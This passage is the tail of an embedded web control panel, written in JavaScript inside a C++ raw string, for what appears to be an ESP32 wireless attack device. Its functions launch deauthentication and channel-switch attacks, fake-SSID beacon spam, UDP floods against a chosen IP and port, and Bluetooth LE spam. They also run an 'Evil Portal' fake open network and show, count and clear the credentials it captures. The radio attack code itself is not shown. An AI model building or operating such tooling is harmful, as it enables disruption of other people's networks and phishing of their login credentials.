  var ssid=document.getElementById('ssidInput').value.trim();
  if(!bssid){alert('Enter BSSID');return;}
  if(ch==='0'){alert('Select channel');return;}
  if(!confirm('CSA on '+(ssid||bssid)+' CH'+ch+'?'))return;
  fetch('/csa?bssid='+bssid+'&ch='+ch+'&ssid='+encodeURIComponent(ssid))
    .then(function(r){return r.text();}).then(function(d){
      if(d.indexOf('ERROR')>-1){alert(d);return;}
      setBadge('csa');setType('→ '+(ssid||bssid));startStatusMon();
    }).catch(function(){alert('Failed');});
}
function startBeacon(){
  if(!confirm('Start beacon spam?'))return;
  fetch('/beacon_spam').then(function(r){return r.text();}).then(function(d){
    if(d.indexOf('ERROR')>-1){alert(d);return;}
    setBadge('beacon');setType('→ fake SSIDs');startStatusMon();
  }).catch(function(){alert('Failed');});
}
function stopAll(){
  fetch('/stop').then(function(r){return r.text();}).then(function(){
    setBadge('idle');setType('');stopStatusMon();
  });
}
function startUDP(){
  var ip=document.getElementById('udpIP').value.trim();
  var port=parseInt(document.getElementById('udpPort').value);
  if(!ip){alert('Enter IP');return;}
  if(port<1||port>65535){alert('Bad port');return;}
  if(!confirm('UDP flood → '+ip+':'+port+'?'))return;
  fetch('/udp_flood?ip='+ip+'&port='+port).then(function(r){return r.text();}).then(function(d){
    if(d.indexOf('ERROR')>-1){alert(d);return;}
    setBadge('udpflood');setType('→ '+ip+':'+port);startStatusMon();
  }).catch(function(){alert('Failed');});
}
function startAppleJuice(){
  if(!confirm('Start Apple Juice BLE spam?'))return;
  fetch('/applejuice').then(function(r){return r.text();}).then(function(d){
    if(d.indexOf('ERROR')>-1){alert(d);return;}
    setBadge('applejuice');setType('→ BLE spam');startStatusMon();
  }).catch(function(){alert('Failed');});
}
function stopAppleJuiceUI(){
  fetch('/applejuice_stop').then(function(r){return r.text();}).then(function(){
    setBadge('idle');setType('');stopStatusMon();
  });
}

// ── EVIL PORTAL ──────────────────────────────────────────────────────────────
var portalPollTimer=null;
function startPortal(){
  var ssid=document.getElementById('portalSSID').value.trim();
  if(!confirm('Start Evil Portal'+(ssid?' as "'+ssid+'"':'')+' ?\nAll other attacks will stop. AP will switch to open network.'))return;
  fetch('/portal_start?ssid='+encodeURIComponent(ssid||'Free-WiFi'),{signal:AbortSignal.timeout(4000)})
    .then(function(r){return r.text();}).then(function(d){
      document.getElementById('portalBadge').className='badge b-portal';
      document.getElementById('portalBadge').textContent='ACTIVE';
      document.getElementById('livePortalStatus').style.color='#67e8f9';
      document.getElementById('livePortalStatus').textContent='ON';
      startPortalPoll();
      startAutoReconnect();
    }).catch(function(){
      // AP switches SSID so fetch may timeout — check status after reconnect
      document.getElementById('portalBadge').className='badge b-portal';
      document.getElementById('portalBadge').textContent='ACTIVE (reconnect)';
      startAutoReconnect();
    });
}
function stopPortal(){
  fetch('/portal_stop').then(function(r){return r.text();}).then(function(){
    document.getElementById('portalBadge').className='badge b-off';
    document.getElementById('portalBadge').textContent='IDLE';
    document.getElementById('livePortalStatus').style.color='var(--muted)';
    document.getElementById('livePortalStatus').textContent='OFF';
    document.getElementById('portalCredCount').textContent='';
    stopPortalPoll();
  });
}
function startPortalPoll(){
  if(portalPollTimer)return;
  portalPollTimer=setInterval(function(){
    fetch('/portal_status').then(function(r){return r.text();}).then(function(d){
      var p=d.split(',');
      var on=p[0]==='1';
      var cnt=parseInt(p[2]||'0');
      if(!on){
        document.getElementById('portalBadge').className='badge b-off';
        document.getElementById('portalBadge').textContent='IDLE';
        document.getElementById('livePortalStatus').style.color='var(--muted)';
        document.getElementById('livePortalStatus').textContent='OFF';
        stopPortalPoll();
      } else {
        document.getElementById('portalCredCount').textContent=cnt>0?cnt+' cred'+(cnt===1?'':'s')+' captured':'';
      }
    }).catch(function(){});
  },3000);
}
function stopPortalPoll(){if(portalPollTimer){clearInterval(portalPollTimer);portalPollTimer=null;}}
function loadCreds(){
  var box=document.getElementById('credsBox');
  box.style.display='block';
  box.textContent='Loading...';
  fetch('/portal_creds').then(function(r){return r.text();}).then(function(d){
    box.textContent=d;
  }).catch(function(){box.textContent='Failed';});
}
function clearCreds(){
  if(!confirm('Clear all captured credentials?'))return;
  fetch('/portal_clear').then(function(){
    var box=document.getElementById('credsBox');
    if(box.style.display!=='none')box.textContent='(none)';
    document.getElementById('portalCredCount').textContent='';
  });
}

// ── Config helpers ────────────────────────────────────────────────────────────
function saveSTA(){
  var ss=document.getElementById('staSSID').value.trim();
  var pp=document.getElementById('staPass').value;
  if(!ss){alert('Enter SSID');return;}
  setSTAStatus('busy','Connecting to '+ss+'...');
  fetch('/savesta?ssid='+encodeURIComponent(ss)+'&pass='+encodeURIComponent(pp))
    .then(function(r){return r.text();}).then(function(d){
      // Start polling — server is attempting to connect
      startSTAPoll();
    }).catch(function(){
      setSTAStatus('fail','Request failed');
    });
}
function saveAP(){
  var ss=document.getElementById('apSSID').value.trim();
  var pp=document.getElementById('apPass').value;
  if(!ss){alert('Enter SSID');return;}
  if(pp.length<8){alert('Pass min 8');return;}
  if(!confirm('Rename AP to "'+ss+'"?'))return;
  fetch('/setap?ssid='+encodeURIComponent(ss)+'&pass='+encodeURIComponent(pp))
    .then(function(r){return r.text();}).then(function(d){alert(d);})
    .catch(function(){alert('Sent — reconnect');});
}
function saveOTAPass(){
  var p=document.getElementById('otaPassInput').value;
  if(p.length<4){alert('Min 4 chars');return;}
  fetch('/setotapass?pass='+encodeURIComponent(p)).then(function(r){return r.text();}).then(function(d){alert(d);});
}
function loadOtaInfo(){
  fetch('/ota_info').then(function(r){return r.text();}).then(function(d){
    var parts=d.trim().split(',');
    document.getElementById('liveWebIP').textContent=parts[0]||'';
    document.getElementById('liveOtaIP').textContent=parts[1]||'';
    document.getElementById('otaWebAddr').textContent=parts[0]||'';
    document.getElementById('otaFlashAddr').textContent=parts[1]||'';
  }).catch(function(){});
}
function pollPkts(){
  fetch('/pkt_count').then(function(r){return r.text();}).then(function(d){
    document.getElementById('liveCount').textContent=d.trim();
  }).catch(function(){});
}
function loadSysInfo(){
  fetch('/sysinfo').then(function(r){return r.text();}).then(function(d){
    document.getElementById('sysInfo').innerHTML=d;
    var vs=document.querySelectorAll('#sysInfo .stat-v');
    if(vs.length>=2)document.getElementById('liveHeap').textContent=vs[1].textContent;
  }).catch(function(){});
}
function loadLog(){
  fetch('/log').then(function(r){return r.text();}).then(function(d){
    var box=document.getElementById('logBox');
    box.textContent=d||'(empty)';box.scrollTop=box.scrollHeight;
  }).catch(function(){});
}

// ── STA STATUS ───────────────────────────────────────────────────────────────
var staPollTimer=null;
var staConnectedIP='';

function setSTAStatus(state,msg){
  var val=document.getElementById('staStatusVal');
  var btn=document.getElementById('attackConnBtn');
  var infoEl=document.getElementById('connAttackInfo');
  var dbtn=document.getElementById('deauthConnBtn');
  if(!val)return;
  val.className='sta-val';
  if(state==='conn'){
    val.className='sta-val conn';
    val.textContent='✓ Connected — '+msg;
    if(btn){btn.style.display='inline-block';}
    if(infoEl){infoEl.innerHTML='<b style="color:var(--green)">✓ Connected</b> — IP: '+msg+'<br>Tap button below to deauth the AP you are connected to.';}
    if(dbtn){dbtn.disabled=false;}
  } else if(state==='fail'){
    val.className='sta-val fail';
    val.textContent='✗ '+msg;
    if(btn){btn.style.display='none';}
    if(infoEl){infoEl.innerHTML='<span style="color:var(--red)">✗ Not connected</span> — Connect via CONFIG tab to enable this attack.';}
    if(dbtn){dbtn.disabled=true;}
  } else {
    val.className='sta-val busy';
    val.textContent='⟳ '+msg;
    if(btn){btn.style.display='none';}
    if(infoEl){infoEl.innerHTML='<span style="color:var(--yellow)">⟳ '+msg+'</span>';}
    if(dbtn){dbtn.disabled=true;}
  }
}

function pollSTAStatus(){
  fetch('/sta_status',{signal:AbortSignal.timeout(2500)})
    .then(function(r){return r.text();}).then(function(d){
      d=d.trim();
      if(d.startsWith('connected,')){
        var ip=d.substring('connected,'.length);
        staConnectedIP=ip;
        setSTAStatus('conn',ip);
        stopSTAPoll(); // stop fast poll, switch to slow heartbeat
        startSTAHeartbeat();
      } else if(d==='failed'){
        staConnectedIP='';
        setSTAStatus('fail','Connection failed');
        stopSTAPoll();
      } else {
        setSTAStatus('busy','Connecting...');
      }
    }).catch(function(){
      setSTAStatus('busy','Waiting...');
    });
}

function startSTAPoll(){
  stopSTAPoll();
  setSTAStatus('busy','Connecting...');
  staPollTimer=setInterval(pollSTAStatus,1500);
  // Auto-stop after 30s if never connected
  setTimeout(function(){
    if(staPollTimer){stopSTAPoll();setSTAStatus('fail','Timed out');}
  },30000);
}
function stopSTAPoll(){if(staPollTimer){clearInterval(staPollTimer);staPollTimer=null;}}

var staHeartTimer=null;
function startSTAHeartbeat(){
  stopSTAHeartbeat();
  staHeartTimer=setInterval(function(){
    fetch('/sta_status',{signal:AbortSignal.timeout(2500)})
      .then(function(r){return r.text();}).then(function(d){
        d=d.trim();
        if(d.startsWith('connected,')){
          var ip=d.substring('connected,'.length);
          if(ip!==staConnectedIP){staConnectedIP=ip;setSTAStatus('conn',ip);}
        } else {
          staConnectedIP='';
          setSTAStatus('fail','Disconnected');
          stopSTAHeartbeat();
        }
      }).catch(function(){});
  },8000);
}
function stopSTAHeartbeat(){if(staHeartTimer){clearInterval(staHeartTimer);staHeartTimer=null;}}

// ── ATTACK CONNECTED WIFI ────────────────────────────────────────────────────
function attackConnected(){
  if(!confirm('Deauth the AP you are currently connected to?\nThis will disrupt your own connection to this control panel.\n\nContinue?'))return;
  var inten=curInten||3;
  fetch('/deauth_connected?inten='+inten,{signal:AbortSignal.timeout(3000)})
    .then(function(r){return r.text();}).then(function(d){
      if(d.indexOf('ERROR')>-1){alert(d);return;}
      setBadge('deauth');setType('→ connected AP');startStatusMon();startAutoReconnect();
    }).catch(function(){
      // Request may fail immediately as radio hops — that's expected
      setBadge('deauth');setType('→ connected AP');startAutoReconnect();
    });
}

// ── BOOT ─────────────────────────────────────────────────────────────────────
// Initial STA status check on load
pollSTAStatus();
// If still connecting after 1s, start fast poll
setTimeout(function(){
  fetch('/sta_status',{signal:AbortSignal.timeout(2000)})
    .then(function(r){return r.text();}).then(function(d){
      d=d.trim();
      if(d==='connecting'){startSTAPoll();}
      else if(d.startsWith('connected,')){
        var ip=d.substring('connected,'.length);
        staConnectedIP=ip;
        setSTAStatus('conn',ip);
        startSTAHeartbeat();
      } else {
        setSTAStatus('fail','Not connected');
      }
    }).catch(function(){setSTAStatus('fail','Not connected');});
},1000);

loadSysInfo();loadLog();loadOtaInfo();
setInterval(loadSysInfo,6000);setInterval(pollPkts,2000);
setInterval(loadLog,12000);setInterval(loadOtaInfo,10000);
</script>
</body>
</html>
)rawliteral";
